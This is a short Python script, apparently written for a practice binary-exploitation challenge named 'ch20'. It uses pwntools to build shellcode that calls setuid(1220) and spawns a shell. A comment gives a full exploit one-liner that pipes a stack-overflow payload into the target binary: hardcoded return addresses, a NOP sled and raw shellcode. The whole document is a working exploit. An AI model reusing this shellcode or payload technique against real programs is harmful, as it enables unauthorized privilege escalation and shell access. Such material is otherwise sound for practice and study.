from pwn import *



shellcode = asm(shellcraft.setuid(1220) + shellcraft.sh())
print(shellcode)
print(len(shellcode))


#(python2 -c 'print "5\n2\n" + "\x95\xfd\xff\xbf" + "AAAA" "\xa1\xfd\xff\xbf" + "\x90" * 12 + "1\xdbj\x17X\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" + "\x95\xfd\xff\xbf"'; cat)  | env -i ./ch20
